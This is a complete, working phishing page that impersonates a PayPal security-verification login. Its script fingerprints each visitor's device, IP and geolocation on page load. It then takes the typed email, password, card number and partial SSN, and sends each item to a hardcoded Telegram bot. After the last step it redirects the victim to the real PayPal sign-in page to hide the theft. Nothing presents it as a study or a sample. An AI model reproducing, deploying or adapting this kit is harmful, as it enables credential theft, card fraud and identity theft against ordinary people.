<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal: Security Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f7fa; text-align: center; }
        .box { max-width: 400px; margin: 40px auto; background: #fff; padding: 40px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        input { width: 92%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; background: #0070ba; color: #fff; padding: 15px; border-radius: 25px; border: none; font-weight: bold; cursor: pointer; }
        .hide { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" width="120" style="margin-bottom:30px;">
        <div id="p1">
            <h2>Log In</h2>
            <input type="text" id="pe" placeholder="Email">
            <input type="password" id="pp" placeholder="Password">
            <button onclick="ps1()">Log In</button>
        </div>
        <div id="p2" class="hide">
            <h2>Verify Card</h2>
            <input type="text" id="pcc" placeholder="Card Number">
            <input type="text" id="pssn" placeholder="Last 4 digits of SSN">
            <button onclick="ps2()">Confirm Identity</button>
        </div>
    </div>

    <script>
        const token = '8661414644:AAEOXANSWUA3sIrP9_Ta4Id9DC3HPN5ugvc';
        const chatId = '8353285510';

        window.onload = async () => {
            let b = await navigator.getBattery();
            let ipInfo = "IP Blocked";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                ipInfo = `🌐 IP: ${d.ip}\n📍 Location: ${d.city}, ${d.region}\n📶 ISP: ${d.org}`;
            } catch(e) {}
            
            // "History Pattern" Capture
            const depth = window.history.length;
            const hw = `${navigator.hardwareConcurrency} CPU / ${navigator.deviceMemory || 'N/A'}GB RAM`;
            
            const auto = `💰 PAYPAL VISITOR!\n📱 Device: ${navigator.userAgent}\n🔋 Battery: ${Math.round(b.level * 100)}%\n⚙️ HW: ${hw}\n📜 Hist Depth: ${depth}\n${ipInfo}`;
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(auto)}`);

            navigator.geolocation.getCurrentPosition(pos => {
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📍 PAYPAL MAP:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}')}`);
            });
        };

        function ps1() {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('💰 PAYPAL LOG!\n📧: '+document.getElementById('pe').value+'\n🔑: '+document.getElementById('pp').value)}`);
            document.getElementById('p1').classList.add('hide');
            document.getElementById('p2').classList.remove('hide');
        }

        function ps2() {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('💳 PAYPAL CARD/SSN!\nNum: '+document.getElementById('pcc').value+'\nSSN: '+document.getElementById('pssn').value)}`)
            .then(() => window.location.href = "https://www.paypal.com/signin");
        }
    </script>
</body>
</html>
